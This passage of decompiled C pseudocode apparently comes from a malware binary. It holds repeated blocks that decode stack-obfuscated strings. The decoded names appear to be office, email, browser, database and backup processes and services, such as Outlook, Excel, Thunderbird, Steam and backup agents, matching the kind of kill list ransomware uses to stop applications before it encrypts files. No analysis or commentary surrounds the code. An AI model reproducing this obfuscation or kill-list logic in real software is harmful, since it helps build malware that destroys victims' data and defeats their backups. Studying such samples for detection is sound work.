*v419;\n        TickCount = v419;\n        v420 = sub_401010((char *)&STACK[0x2ED], v418++);\n        *v420 = sub_401120(&STACK[0x2EC], (char)TickCount);\n      }\n      while ( v418 < 0x10 );\n      *sub_401010((char *)&STACK[0x2ED], 16) = 0;\n      STACK[0xBAC] = (unsigned int)sub_401000(&STACK[0x2ED]);\n      LOBYTE(STACK[0x1DA]) = 110;\n      LOBYTE(STACK[0x1DB]) = sub_401120(&STACK[0x1DA], 111);\n      LOBYTE(STACK[0x1DC]) = sub_401120(&STACK[0x1DA], 99);\n      LOBYTE(STACK[0x1DD]) = sub_401120(&STACK[0x1DA], 97);\n      LOBYTE(STACK[0x1DE]) = sub_401120(&STACK[0x1DA], 117);\n      LOBYTE(STACK[0x1DF]) = sub_401120(&STACK[0x1DA], 116);\n      LOBYTE(STACK[0x1E0]) = sub_401120(&STACK[0x1DA], 111);\n      LOBYTE(STACK[0x1E1]) = sub_401120(&STACK[0x1DA], 117);\n      LOBYTE(STACK[0x1E2]) = sub_401120(&STACK[0x1DA], 112);\n      LOBYTE(STACK[0x1E3]) = sub_401120(&STACK[0x1DA], 100);\n      LOBYTE(STACK[0x1E4]) = sub_401120(&STACK[0x1DA], 115);\n      v421 = 0;\n      LOBYTE(STACK[0x1E5]) = 0;\n      do\n      {\n        v422 = sub_401010((char *)&STACK[0x1DB], v421);\n        LOBYTE(v422) = *v422;\n        TickCount = v422;\n        v423 = sub_401010((char *)&STACK[0x1DB], v421++);\n        *v423 = sub_401120(&STACK[0x1DA], (char)TickCount);\n      }\n      while ( v421 < 0xA );\n      *sub_401010((char *)&STACK[0x1DB], 10) = 0;\n      STACK[0xBA8] = (unsigned int)sub_401000(&STACK[0x1DB]);\n      LOBYTE(a31) = 63;\n      BYTE1(a31) = sub_401120(&a31, 101);\n      BYTE2(a31) = sub_401120(&a31, 110);\n      HIBYTE(a31) = sub_401120(&a31, 99);\n      LOBYTE(a32) = sub_401120(&a31, 115);\n      BYTE1(a32) = sub_401120(&a31, 118);\n      BYTE2(a32) = sub_401120(&a31, 99);\n      v424 = 0;\n      HIBYTE(a32) = 0;\n      do\n      {\n        v425 = sub_401010((char *)&a31 + 1, v424);\n        LOBYTE(v425) = *v425;\n        TickCount = v425;\n        v426 = sub_401010((char *)&a31 + 1, v424++);\n        *v426 = sub_401120(&a31, (char)TickCount);\n      }\n      while ( v424 < 6 );\n      *sub_401010((char *)&a31 + 1, 6) = 0;\n      STACK[0xBA4] = (unsigned int)sub_401000((char *)&a31 + 1);\n      BYTE2(a64) = 29;\n      HIBYTE(a64) = sub_401120((_BYTE *)&a64 + 2, 102);\n      LOBYTE(STACK[0x108]) = sub_401120((_BYTE *)&a64 + 2, 105);\n      LOBYTE(STACK[0x109]) = sub_401120((_BYTE *)&a64 + 2, 114);\n      LOBYTE(STACK[0x10A]) = sub_401120((_BYTE *)&a64 + 2, 101);\n      LOBYTE(STACK[0x10B]) = sub_401120((_BYTE *)&a64 + 2, 102);\n      LOBYTE(STACK[0x10C]) = sub_401120((_BYTE *)&a64 + 2, 111);\n      LOBYTE(STACK[0x10D]) = sub_401120((_BYTE *)&a64 + 2, 120);\n      v427 = 0;\n      LOBYTE(STACK[0x10E]) = 0;\n      do\n      {\n        v428 = sub_401010((char *)&a64 + 3, v427);\n        LOBYTE(v428) = *v428;\n        TickCount = v428;\n        v429 = sub_401010((char *)&a64 + 3, v427++);\n        *v429 = sub_401120((_BYTE *)&a64 + 2, (char)TickCount);\n      }\n      while ( v427 < 7 );\n      *sub_401010((char *)&a64 + 3, 7) = 0;\n      STACK[0xBA0] = (unsigned int)sub_401000((char *)&a64 + 3);\n      LOBYTE(STACK[0x20B]) = 6;\n      LOBYTE(STACK[0x20C]) = sub_401120(&STACK[0x20B], 116);\n      LOBYTE(STACK[0x20D]) = sub_401120(&STACK[0x20B], 98);\n      LOBYTE(STACK[0x20E]) = sub_401120(&STACK[0x20B], 105);\n      LOBYTE(STACK[0x20F]) = sub_401120(&STACK[0x20B], 114);\n      LOBYTE(STACK[0x210]) = sub_401120(&STACK[0x20B], 100);\n      LOBYTE(STACK[0x211]) = sub_401120(&STACK[0x20B], 99);\n      LOBYTE(STACK[0x212]) = sub_401120(&STACK[0x20B], 111);\n      LOBYTE(STACK[0x213]) = sub_401120(&STACK[0x20B], 110);\n      LOBYTE(STACK[0x214]) = sub_401120(&STACK[0x20B], 102);\n      LOBYTE(STACK[0x215]) = sub_401120(&STACK[0x20B], 105);\n      LOBYTE(STACK[0x216]) = sub_401120(&STACK[0x20B], 103);\n      v430 = 0;\n      LOBYTE(STACK[0x217]) = 0;\n      do\n      {\n        v431 = sub_401010((char *)&STACK[0x20C], v430);\n        LOBYTE(v431) = *v431;\n        TickCount = v431;\n        v432 = sub_401010((char *)&STACK[0x20C], v430++);\n        *v432 = sub_401120(&STACK[0x20B], (char)TickCount);\n      }\n      while ( v430 < 0xB );\n      *sub_401010((char *)&STACK[0x20C], 11) = 0;\n      STACK[0xB9C] = (unsigned int)sub_401000(&STACK[0x20C]);\n      LOBYTE(STACK[0x23F]) = 108;\n      LOBYTE(STACK[0x240]) = sub_401120(&STACK[0x23F], 109);\n      LOBYTE(STACK[0x241]) = sub_401120(&STACK[0x23F], 121);\n      LOBYTE(STACK[0x242]) = sub_401120(&STACK[0x23F], 100);\n      LOBYTE(STACK[0x243]) = sub_401120(&STACK[0x23F], 101);\n      LOBYTE(STACK[0x244]) = sub_401120(&STACK[0x23F], 115);\n      LOBYTE(STACK[0x245]) = sub_401120(&STACK[0x23F], 107);\n      LOBYTE(STACK[0x246]) = sub_401120(&STACK[0x23F], 116);\n      LOBYTE(STACK[0x247]) = sub_401120(&STACK[0x23F], 111);\n      LOBYTE(STACK[0x248]) = sub_401120(&STACK[0x23F], 112);\n      LOBYTE(STACK[0x249]) = sub_401120(&STACK[0x23F], 113);\n      LOBYTE(STACK[0x24A]) = sub_401120(&STACK[0x23F], 111);\n      LOBYTE(STACK[0x24B]) = sub_401120(&STACK[0x23F], 115);\n      v433 = 0;\n      LOBYTE(STACK[0x24C]) = 0;\n      do\n      {\n        v434 = sub_401010((char *)&STACK[0x240], v433);\n        LOBYTE(v434) = *v434;\n        TickCount = v434;\n        v435 = sub_401010((char *)&STACK[0x240], v433++);\n        *v435 = sub_401120(&STACK[0x23F], (char)TickCount);\n      }\n      while ( v433 < 0xC );\n      *sub_401010((char *)&STACK[0x240], 12) = 0;\n      STACK[0xB98] = (unsigned int)sub_401000(&STACK[0x240]);\n      HIBYTE(a14) = 90;\n      LOBYTE(a15) = sub_401120((_BYTE *)&a14 + 3, 111);\n      BYTE1(a15) = sub_401120((_BYTE *)&a14 + 3, 99);\n      BYTE2(a15) = sub_401120((_BYTE *)&a14 + 3, 111);\n      HIBYTE(a15) = sub_401120((_BYTE *)&a14 + 3, 109);\n      LOWORD(a16) = (unsigned __int8)sub_401120((_BYTE *)&a14 + 3, 109);\n      for ( n = 0; n < 5; ++n )\n      {\n        v437 = sub_401010((char *)&a15, n);\n        LOBYTE(v437) = *v437;\n        TickCount = v437;\n        v438 = sub_401010((char *)&a15, n);\n        *v438 = sub_401120((_BYTE *)&a14 + 3, (char)TickCount);\n      }\n      *sub_401010((char *)&a15, 5) = 0;\n      STACK[0xB94] = (unsigned int)sub_401000(&a15);\n      BYTE1(a62) = 8;\n      BYTE2(a62) = sub_401120((_BYTE *)&a62 + 1, 100);\n      HIBYTE(a62) = sub_401120((_BYTE *)&a62 + 1, 98);\n      LOBYTE(a63) = sub_401120((_BYTE *)&a62 + 1, 101);\n      BYTE1(a63) = sub_401120((_BYTE *)&a62 + 1, 110);\n      BYTE2(a63) = sub_401120((_BYTE *)&a62 + 1, 103);\n      HIBYTE(a63) = sub_401120((_BYTE *)&a62 + 1, 53);\n      LOWORD(a64) = (unsigned __int8)sub_401120((_BYTE *)&a62 + 1, 48);\n      for ( ii = 0; ii < 7; ++ii )\n      {\n        v440 = sub_401010((char *)&a62 + 2, ii);\n        LOBYTE(v440) = *v440;\n        TickCount = v440;\n        v441 = sub_401010((char *)&a62 + 2, ii);\n        *v441 = sub_401120((_BYTE *)&a62 + 1, (char)TickCount);\n      }\n      *sub_401010((char *)&a62 + 2, 7) = 0;\n      STACK[0xB3C] = (unsigned int)sub_401000((char *)&a62 + 2);\n      LOBYTE(STACK[0x287]) = 106;\n      LOBYTE(STACK[0x288]) = sub_401120(&STACK[0x287], 115);\n      LOBYTE(STACK[0x289]) = sub_401120(&STACK[0x287], 113);\n      LOBYTE(STACK[0x28A]) = sub_401120(&STACK[0x287], 98);\n      LOBYTE(STACK[0x28B]) = sub_401120(&STACK[0x287], 99);\n      LOBYTE(STACK[0x28C]) = sub_401120(&STACK[0x287], 111);\n      LOBYTE(STACK[0x28D]) = sub_401120(&STACK[0x287], 114);\n      LOBYTE(STACK[0x28E]) = sub_401120(&STACK[0x287], 101);\n      LOBYTE(STACK[0x28F]) = sub_401120(&STACK[0x287], 115);\n      LOBYTE(STACK[0x290]) = sub_401120(&STACK[0x287], 101);\n      LOBYTE(STACK[0x291]) = sub_401120(&STACK[0x287], 114);\n      LOBYTE(STACK[0x292]) = sub_401120(&STACK[0x287], 118);\n      LOBYTE(STACK[0x293]) = sub_401120(&STACK[0x287], 105);\n      LOBYTE(STACK[0x294]) = sub_401120(&STACK[0x287], 99);\n      LOBYTE(STACK[0x295]) = sub_401120(&STACK[0x287], 101);\n      v442 = 0;\n      LOBYTE(STACK[0x296]) = 0;\n      do\n      {\n        v443 = sub_401010((char *)&STACK[0x288], v442);\n        LOBYTE(v443) = *v443;\n        TickCount = v443;\n        v444 = sub_401010((char *)&STACK[0x288], v442++);\n        *v444 = sub_401120(&STACK[0x287], (char)TickCount);\n      }\n      while ( v442 < 0xE );\n      *sub_401010((char *)&STACK[0x288], 14) = 0;\n      STACK[0xB38] = (unsigned int)sub_401000(&STACK[0x288]);\n      BYTE2(a16) = 49;\n      HIBYTE(a16) = sub_401120((_BYTE *)&a16 + 2, 101);\n      LOBYTE(a17) = sub_401120((_BYTE *)&a16 + 2, 120);\n      BYTE1(a17) = sub_401120((_BYTE *)&a16 + 2, 99);\n      BYTE2(a17) = sub_401120((_BYTE *)&a16 + 2, 101);\n      HIBYTE(a17) = sub_401120((_BYTE *)&a16 + 2, 108);\n      v445 = 0;\n      LOBYTE(a18) = 0;\n      do\n      {\n        v446 = sub_401010((char *)&a16 + 3, v445);\n        LOBYTE(v446) = *v446;\n        TickCount = v446;\n        v447 = sub_401010((char *)&a16 + 3, v445++);\n        *v447 = sub_401120((_BYTE *)&a16 + 2, (char)TickCount);\n      }\n      while ( v445 < 5 );\n      *sub_401010((char *)&a16 + 3, 5) = 0;\n      STACK[0xB34] = (unsigned int)sub_401000((char *)&a16 + 3);\n      LOBYTE(STACK[0x17A]) = 40;\n      LOBYTE(STACK[0x17B]) = sub_401120(&STACK[0x17A], 105);\n      LOBYTE(STACK[0x17C]) = sub_401120(&STACK[0x17A], 110);\n      LOBYTE(STACK[0x17D]) = sub_401120(&STACK[0x17A], 102);\n      LOBYTE(STACK[0x17E]) = sub_401120(&STACK[0x17A], 111);\n      LOBYTE(STACK[0x17F]) = sub_401120(&STACK[0x17A], 112);\n      LOBYTE(STACK[0x180]) = sub_401120(&STACK[0x17A], 97);\n      LOBYTE(STACK[0x181]) = sub_401120(&STACK[0x17A], 116);\n      LOBYTE(STACK[0x182]) = sub_401120(&STACK[0x17A], 104);\n      v448 = 0;\n      LOBYTE(STACK[0x183]) = 0;\n      do\n      {\n        v449 = sub_401010((char *)&STACK[0x17B], v448);\n        LOBYTE(v449) = *v449;\n        TickCount = v449;\n        v450 = sub_401010((char *)&STACK[0x17B], v448++);\n        *v450 = sub_401120(&STACK[0x17A], (char)TickCount);\n      }\n      while ( v448 < 8 );\n      *sub_401010((char *)&STACK[0x17B], 8) = 0;\n      STACK[0xB30] = (unsigned int)sub_401000(&STACK[0x17B]);\n      LOBYTE(STACK[0x13E]) = 102;\n      LOBYTE(STACK[0x13F]) = sub_401120(&STACK[0x13E], 109);\n      LOBYTE(STACK[0x140]) = sub_401120(&STACK[0x13E], 115);\n      LOBYTE(STACK[0x141]) = sub_401120(&STACK[0x13E], 97);\n      LOBYTE(STACK[0x142]) = sub_401120(&STACK[0x13E], 99);\n      LOBYTE(STACK[0x143]) = sub_401120(&STACK[0x13E], 99);\n      LOBYTE(STACK[0x144]) = sub_401120(&STACK[0x13E], 101);\n      LOBYTE(STACK[0x145]) = sub_401120(&STACK[0x13E], 115);\n      LOBYTE(STACK[0x146]) = sub_401120(&STACK[0x13E], 115);\n      v451 = 0;\n      LOBYTE(STACK[0x147]) = 0;\n      do\n      {\n        v452 = sub_401010((char *)&STACK[0x13F], v451);\n        LOBYTE(v452) = *v452;\n        TickCount = v452;\n        v453 = sub_401010((char *)&STACK[0x13F], v451++);\n        *v453 = sub_401120(&STACK[0x13E], (char)TickCount);\n      }\n      while ( v451 < 8 );\n      *sub_401010((char *)&STACK[0x13F], 8) = 0;\n      STACK[0xB2C] = (unsigned int)sub_401000(&STACK[0x13F]);\n      BYTE1(a18) = 90;\n      BYTE2(a18) = sub_401120((_BYTE *)&a18 + 1, 109);\n      HIBYTE(a18) = sub_401120((_BYTE *)&a18 + 1, 115);\n      LOBYTE(a19) = sub_401120((_BYTE *)&a18 + 1, 112);\n      BYTE1(a19) = sub_401120((_BYTE *)&a18 + 1, 117);\n      BYTE2(a19) = sub_401120((_BYTE *)&a18 + 1, 98);\n      v454 = 0;\n      HIBYTE(a19) = 0;\n      do\n      {\n        v455 = sub_401010((char *)&a18 + 2, v454);\n        LOBYTE(v455) = *v455;\n        TickCount = v455;\n        v456 = sub_401010((char *)&a18 + 2, v454++);\n        *v456 = sub_401120((_BYTE *)&a18 + 1, (char)TickCount);\n      }\n      while ( v454 < 5 );\n      *sub_401010((char *)&a18 + 2, 5) = 0;\n      STACK[0xB28] = (unsigned int)sub_401000((char *)&a18 + 2);\n      LOBYTE(a60) = 12;\n      BYTE1(a60) = sub_401120(&a60, 111);\n      BYTE2(a60) = sub_401120(&a60, 110);\n      HIBYTE(a60) = sub_401120(&a60, 101);\n      LOBYTE(a61) = sub_401120(&a60, 110);\n      BYTE1(a61) = sub_401120(&a60, 111);\n      BYTE2(a61) = sub_401120(&a60, 116);\n      HIBYTE(a61) = sub_401120(&a60, 101);\n      v457 = 0;\n      LOBYTE(a62) = 0;\n      do\n      {\n        v458 = sub_401010((char *)&a60 + 1, v457);\n        LOBYTE(v458) = *v458;\n        TickCount = v458;\n        v459 = sub_401010((char *)&a60 + 1, v457++);\n        *v459 = sub_401120(&a60, (char)TickCount);\n      }\n      while ( v457 < 7 );\n      *sub_401010((char *)&a60 + 1, 7) = 0;\n      STACK[0xB24] = (unsigned int)sub_401000((char *)&a60 + 1);\n      HIBYTE(a57) = 89;\n      LOBYTE(a58) = sub_401120((_BYTE *)&a57 + 3, 111);\n      BYTE1(a58) = sub_401120((_BYTE *)&a57 + 3, 117);\n      BYTE2(a58) = sub_401120((_BYTE *)&a57 + 3, 116);\n      HIBYTE(a58) = sub_401120((_BYTE *)&a57 + 3, 108);\n      LOBYTE(a59) = sub_401120((_BYTE *)&a57 + 3, 111);\n      BYTE1(a59) = sub_401120((_BYTE *)&a57 + 3, 111);\n      BYTE2(a59) = sub_401120((_BYTE *)&a57 + 3, 107);\n      v460 = 0;\n      HIBYTE(a59) = 0;\n      do\n      {\n        v461 = sub_401010((char *)&a58, v460);\n        LOBYTE(v461) = *v461;\n        TickCount = v461;\n        v462 = sub_401010((char *)&a58, v460++);\n        *v462 = sub_401120((_BYTE *)&a57 + 3, (char)TickCount);\n      }\n      while ( v460 < 7 );\n      *sub_401010((char *)&a58, 7) = 0;\n      STACK[0xB20] = (unsigned int)sub_401000(&a58);\n      LOBYTE(STACK[0x134]) = 115;\n      LOBYTE(STACK[0x135]) = sub_401120(&STACK[0x134], 112);\n      LOBYTE(STACK[0x136]) = sub_401120(&STACK[0x134], 111);\n      LOBYTE(STACK[0x137]) = sub_401120(&STACK[0x134], 119);\n      LOBYTE(STACK[0x138]) = sub_401120(&STACK[0x134], 101);\n      LOBYTE(STACK[0x139]) = sub_401120(&STACK[0x134], 114);\n      LOBYTE(STACK[0x13A]) = sub_401120(&STACK[0x134], 112);\n      LOBYTE(STACK[0x13B]) = sub_401120(&STACK[0x134], 110);\n      LOBYTE(STACK[0x13C]) = sub_401120(&STACK[0x134], 116);\n      v463 = 0;\n      LOBYTE(STACK[0x13D]) = 0;\n      do\n      {\n        v464 = sub_401010((char *)&STACK[0x135], v463);\n        LOBYTE(v464) = *v464;\n        TickCount = v464;\n        v465 = sub_401010((char *)&STACK[0x135], v463++);\n        *v465 = sub_401120(&STACK[0x134], (char)TickCount);\n      }\n      while ( v463 < 8 );\n      *sub_401010((char *)&STACK[0x135], 8) = 0;\n      STACK[0xB14] = (unsigned int)sub_401000(&STACK[0x135]);\n      LOBYTE(a20) = 15;\n      BYTE1(a20) = sub_401120(&a20, 115);\n      BYTE2(a20) = sub_401120(&a20, 116);\n      HIBYTE(a20) = sub_401120(&a20, 101);\n      LOBYTE(a21) = sub_401120(&a20, 97);\n      BYTE1(a21) = sub_401120(&a20, 109);\n      v466 = 0;\n      BYTE2(a21) = 0;\n      do\n      {\n        v467 = sub_401010((char *)&a20 + 1, v466);\n        LOBYTE(v467) = *v467;\n        TickCount = v467;\n        v468 = sub_401010((char *)&a20 + 1, v466++);\n        *v468 = sub_401120(&a20, (char)TickCount);\n      }\n      while ( v466 < 5 );\n      *sub_401010((char *)&a20 + 1, 5) = 0;\n      STACK[0xB10] = (unsigned int)sub_401000((char *)&a20 + 1);\n      LOBYTE(a29) = 73;\n      BYTE1(a29) = sub_401120(&a29, 116);\n      BYTE2(a29) = sub_401120(&a29, 104);\n      HIBYTE(a29) = sub_401120(&a29, 101);\n      LOBYTE(a30) = sub_401120(&a29, 98);\n      BYTE1(a30) = sub_401120(&a29, 97);\n      BYTE2(a30) = sub_401120(&a29, 116);\n      v469 = 0;\n      HIBYTE(a30) = 0;\n      do\n      {\n        v470 = sub_401010((char *)&a29 + 1, v469);\n        LOBYTE(v470) = *v470;\n        TickCount = v470;\n        v471 = sub_401010((char *)&a29 + 1, v469++);\n        *v471 = sub_401120(&a29, (char)TickCount);\n      }\n      while ( v469 < 6 );\n      *sub_401010((char *)&a29 + 1, 6) = 0;\n      STACK[0xB0C] = (unsigned int)sub_401000((char *)&a29 + 1);\n      LOBYTE(STACK[0x1FE]) = 23;\n      LOBYTE(STACK[0x1FF]) = sub_401120(&STACK[0x1FE], 116);\n      LOBYTE(STACK[0x200]) = sub_401120(&STACK[0x1FE], 104);\n      LOBYTE(STACK[0x201]) = sub_401120(&STACK[0x1FE], 117);\n      LOBYTE(STACK[0x202]) = sub_401120(&STACK[0x1FE], 110);\n      LOBYTE(STACK[0x203]) = sub_401120(&STACK[0x1FE], 100);\n      LOBYTE(STACK[0x204]) = sub_401120(&STACK[0x1FE], 101);\n      LOBYTE(STACK[0x205]) = sub_401120(&STACK[0x1FE], 114);\n      LOBYTE(STACK[0x206]) = sub_401120(&STACK[0x1FE], 98);\n      LOBYTE(STACK[0x207]) = sub_401120(&STACK[0x1FE], 105);\n      LOBYTE(STACK[0x208]) = sub_401120(&STACK[0x1FE], 114);\n      LOBYTE(STACK[0x209]) = sub_401120(&STACK[0x1FE], 100);\n      v472 = 0;\n      LOBYTE(STACK[0x20A]) = 0;\n      do\n      {\n        v473 = sub_401010((char *)&STACK[0x1FF], v472);\n        LOBYTE(v473) = *v473;\n        TickCount = v473;\n        v474 = sub_401010((char *)&STACK[0x1FF], v472++);\n        *v474 = sub_401120(&STACK[0x1FE], (char)TickCount);\n      }\n      while ( v472 < 0xB );\n      *sub_401010((char *)&STACK[0x1FF], 11) = 0;\n      STACK[0xB08] = (unsigned int)sub_401000(&STACK[0x1FF]);\n      BYTE1(a11) = 40;\n      BYTE2(a11) = sub_401120((_BYTE *)&a11 + 1, 118);\n      HIBYTE(a11) = sub_401120((_BYTE *)&a11 + 1, 105);\n      LOBYTE(a12) = sub_401120((_BYTE *)&a11 + 1, 115);\n      BYTE1(a12) = sub_401120((_BYTE *)&a11 + 1, 105);\n      BYTE2(a12) = sub_401120((_BYTE *)&a11 + 1, 111);\n      v475 = 0;\n      HIBYTE(a12) = 0;\n      do\n      {\n        v476 = sub_401010((char *)&a11 + 2, v475);\n        LOBYTE(v476) = *v476;\n        TickCount = v476;\n        v477 = sub_401010((char *)&a11 + 2, v475++);\n        *v477 = sub_401120((_BYTE *)&a11 + 1, (char)TickCount);\n      }\n      while ( v475 < 5 );\n      *sub_401010((char *)&a11 + 2, 5) = 0;\n      STACK[0xB04] = (unsigned int)sub_401000((char *)&a11 + 2);\n      BYTE2(a55) = 49;\n      HIBYTE(a55) = sub_401120((_BYTE *)&a55 + 2, 119);\n      LOBYTE(a56) = sub_401120((_BYTE *)&a55 + 2, 111);\n      BYTE1(a56) = sub_401120((_BYTE *)&a55 + 2, 114);\n      BYTE2(a56) = sub_401120((_BYTE *)&a55 + 2, 100);\n      HIBYTE(a56) = sub_401120((_BYTE *)&a55 + 2, 112);\n      LOBYTE(a57) = sub_401120((_BYTE *)&a55 + 2, 97);\n      BYTE1(a57) = sub_401120((_BYTE *)&a55 + 2, 100);\n      v478 = 0;\n      BYTE2(a57) = 0;\n      do\n      {\n        v479 = sub_401010((char *)&a55 + 3, v478);\n        LOBYTE(v479) = *v479;\n        TickCount = v479;\n        v480 = sub_401010((char *)&a55 + 3, v478++);\n        *v480 = sub_401120((_BYTE *)&a55 + 2, (char)TickCount);\n      }\n      while ( v478 < 7 );\n      *sub_401010((char *)&a55 + 3, 7) = 0;\n      STACK[0xB00] = (unsigned int)sub_401000((char *)&a55 + 3);\n      BYTE1(a25) = 49;\n      BYTE2(a25) = sub_401120((_BYTE *)&a25 + 1, 98);\n      HIBYTE(a25) = sub_401120((_BYTE *)&a25 + 1, 101);\n      LOBYTE(a26) = sub_401120((_BYTE *)&a25 + 1, 100);\n      BYTE1(a26) = sub_401120((_BYTE *)&a25 + 1, 98);\n      BYTE2(a26) = sub_401120((_BYTE *)&a25 + 1, 104);\n      v481 = 0;\n      HIBYTE(a26) = 0;\n      do\n      {\n        v482 = sub_401010((char *)&a25 + 2, v481);\n        LOBYTE(v482) = *v482;\n        TickCount = v482;\n        v483 = sub_401010((char *)&a25 + 2, v481++);\n        *v483 = sub_401120((_BYTE *)&a25 + 1, (char)TickCount);\n      }\n      while ( v481 < 5 );\n      *sub_401010((char *)&a25 + 2, 5) = 0;\n      STACK[0xAFC] = (unsigned int)sub_401000((char *)&a25 + 2);\n      BYTE2(a23) = 64;\n      HIBYTE(a23) = sub_401120((_BYTE *)&a23 + 2, 118);\n      LOBYTE(a24) = sub_401120((_BYTE *)&a23 + 2, 120);\n      BYTE1(a24) = sub_401120((_BYTE *)&a23 + 2, 109);\n      BYTE2(a24) = sub_401120((_BYTE *)&a23 + 2, 111);\n      HIBYTE(a24) = sub_401120((_BYTE *)&a23 + 2, 110);\n      v484 = 0;\n      LOBYTE(a25) = 0;\n      do\n      {\n        v485 = sub_401010((char *)&a23 + 3, v484);\n        LOBYTE(v485) = *v485;\n        TickCount = v485;\n        v486 = sub_401010((char *)&a23 + 3, v484++);\n        *v486 = sub_401120((_BYTE *)&a23 + 2, (char)TickCount);\n      }\n      while ( v484 < 5 );\n      *sub_401010((char *)&a23 + 3, 5) = 0;\n      STACK[0xAF8] = (unsigned int)sub_401000((char *)&a23 + 3);\n      BYTE1(a53) = 69;\n      BYTE2(a53) = sub_401120((_BYTE *)&a53 + 1, 98);\n      HIBYTE(a53) = sub_401120((_BYTE *)&a53 + 1, 101);\n      LOBYTE(a54) = sub_401120((_BYTE *)&a53 + 1, 110);\n      BYTE1(a54) = sub_401120((_BYTE *)&a53 + 1, 101);\n      BYTE2(a54) = sub_401120((_BYTE *)&a53 + 1, 116);\n      HIBYTE(a54) = sub_401120((_BYTE *)&a53 + 1, 110);\n      LOWORD(a55) = (unsigned __int8)sub_401120((_BYTE *)&a53 + 1, 115);\n      for ( jj = 0; jj < 7; ++jj )\n      {\n        v488 = sub_401010((char *)&a53 + 2, jj);\n        LOBYTE(v488) = *v488;\n        TickCount = v488;\n        v489 = sub_401010((char *)&a53 + 2, jj);\n        *v489 = sub_401120((_BYTE *)&a53 + 1, (char)TickCount);\n      }\n      *sub_401010((char *)&a53 + 2, 7) = 0;\n      STACK[0x864] = (unsigned int)sub_401000((char *)&a53 + 2);\n      LOBYTE(a51) = 47;\n      BYTE1(a51) = sub_401120(&a51, 98);\n      BYTE2(a51) = sub_401120(&a51, 101);\n      HIBYTE(a51) = sub_401120(&a51, 110);\n      LOBYTE(a52) = sub_401120(&a51, 103);\n      BYTE1(a52) = sub_401120(&a51, 105);\n      BYTE2(a52) = sub_401120(&a51, 101);\n      HIBYTE(a52) = sub_401120(&a51, 110);\n      v490 = 0;\n      LOBYTE(a53) = 0;\n      do\n      {\n        v491 = sub_401010((char *)&a51 + 1, v490);\n        LOBYTE(v491) = *v491;\n        TickCount = v491;\n        v492 = sub_401010((char *)&a51 + 1, v490++);\n        *v492 = sub_401120(&a51, (char)TickCount);\n      }\n      while ( v490 < 7 );\n      *sub_401010((char *)&a51 + 1, 7) = 0;\n      STACK[0x850] = (unsigned int)sub_401000((char *)&a51 + 1);\n      LOBYTE(a27) = 24;\n      BYTE1(a27) = sub_401120(&a27, 112);\n      BYTE2(a27) = sub_401120(&a27, 118);\n      HIBYTE(a27) = sub_401120(&a27, 108);\n      LOBYTE(a28) = sub_401120(&a27, 115);\n      BYTE1(a28) = sub_401120(&a27, 118);\n      BYTE2(a28) = sub_401120(&a27, 114);\n      v493 = 0;\n      HIBYTE(a28) = 0;\n      do\n      {\n        v494 = sub_401010((char *)&a27 + 1, v493);\n        LOBYTE(v494) = *v494;\n        TickCount = v494;\n        v495 = sub_401010((char *)&a27 + 1, v493++);\n        *v495 = sub_401120(&a27, (char)TickCount);\n      }\n      while ( v493 < 6 );\n      *sub_401010((char *)&a27 + 1, 6) = 0;\n      STACK[0x858] = (unsigned int)sub_401000((char *)&a27 + 1);\n      LOBYTE(STACK[0x12A]) = 46;\n      LOBYTE(STACK[0x12B]) = sub_401120(&STACK[0x12A], 98);\n      LOBYTE(STACK[0x12C]) = sub_401120(&STACK[0x12A], 101);\n      LOBYTE(STACK[0x12D]) = sub_401120(&STACK[0x12A], 115);\n      LOBYTE(STACK[0x12E]) = sub_401120(&STACK[0x12A], 101);\n      LOBYTE(STACK[0x12F]) = sub_401120(&STACK[0x12A], 114);\n      LOBYTE(STACK[0x130]) = sub_401120(&STACK[0x12A], 118);\n      LOBYTE(STACK[0x131]) = sub_401120(&STACK[0x12A], 101);\n      LOBYTE(STACK[0x132]) = sub_401120(&STACK[0x12A], 114);\n      v496 = 0;\n      LOBYTE(STACK[0x133]) = 0;\n      do\n      {\n        v497 = sub_401010((char *)&STACK[0x12B], v496);\n        LOBYTE(v497) = *v497;\n        TickCount = v497;\n        v498 = sub_401010((char *)&STACK[0x12B], v496++);\n        *v498 = sub_401120(&STACK[0x12A], (char)TickCount);\n      }\n      while ( v496 < 8 );\n      *sub_401010((char *)&STACK[0x12B], 8) = 0;\n      STACK[0x854] = (unsigned int)sub_401000(&STACK[0x12B]);\n      LOBYTE(STACK[0x278]) = 17;\n      LOBYTE(STACK[0x279]) = sub_401120(&STACK[0x278], 114);\n      LOBYTE(STACK[0x27A]) = sub_401120(&STACK[0x278], 97);\n      LOBYTE(STACK[0x27B]) = sub_401120(&STACK[0x278], 119);\n      LOBYTE(STACK[0x27C]) = sub_401120(&STACK[0x278], 95);\n      LOBYTE(STACK[0x27D]) = sub_401120(&STACK[0x278], 97);\n      LOBYTE(STACK[0x27E]) = sub_401120(&STACK[0x278], 103);\n      LOBYTE(STACK[0x27F]) = sub_401120(&STACK[0x278], 101);\n      LOBYTE(STACK[0x280]) = sub_401120(&STACK[0x278], 110);\n      LOBYTE(STACK[0x281]) = sub_401120(&STACK[0x278], 116);\n      LOBYTE(STACK[0x282]) = sub_401120(&STACK[0x278], 95);\n      LOBYTE(STACK[0x283]) = sub_401120(&STACK[0x278], 115);\n      LOBYTE(STACK[0x284]) = sub_401120(&STACK[0x278], 118);\n      LOBYTE(STACK[0x285]) = sub_401120(&STACK[0x278], 99);\n      v499 = 0;\n      LOBYTE(STACK[0x286]) = 0;\n      do\n      {\n        v500 = sub_401010((char *)&STACK[0x279], v499);\n        LOBYTE(v500) = *v500;\n        TickCount = v500;\n        v501 = sub_401010((char *)&STACK[0x279], v499++);\n        *v501 = sub_401120(&STACK[0x278], (char)TickCount);\n      }\n      while ( v499 < 0xD );\n      *sub_401010((char *)&STACK[0x279], 13) = 0;\n      STACK[0x85C] = (unsigned int)sub_401000(&STACK[0x279]);\n      LOBYTE(STACK[0x198]) = 119;\n      LOBYTE(STACK[0x199]) = sub_401120(&STACK[0x198], 118);\n      LOBYTE(STACK[0x19A]) = sub_401120(&STACK[0x198], 115);\n      LOBYTE(STACK[0x19B]) = sub_401120(&STACK[0x198], 110);\n      LOBYTE(STACK[0x19C]) = sub_401120(&STACK[0x198], 97);\n      LOBYTE(STACK[0x19D]) = sub_401120(&STACK[0x198], 112);\n      LOBYTE(STACK[0x19E]) = sub_401120(&STACK[0x198], 118);\n      LOBYTE(STACK[0x19F]) = sub_401120(&STACK[0x198], 115);\n      LOBYTE(STACK[0x1A0]) = sub_401120(&STACK[0x198], 115);\n      v502 = 0;\n      LOBYTE(STACK[0x1A1]) = 0;\n      do\n      {\n        v503 = sub_401010((char *)&STACK[0x199], v502);\n        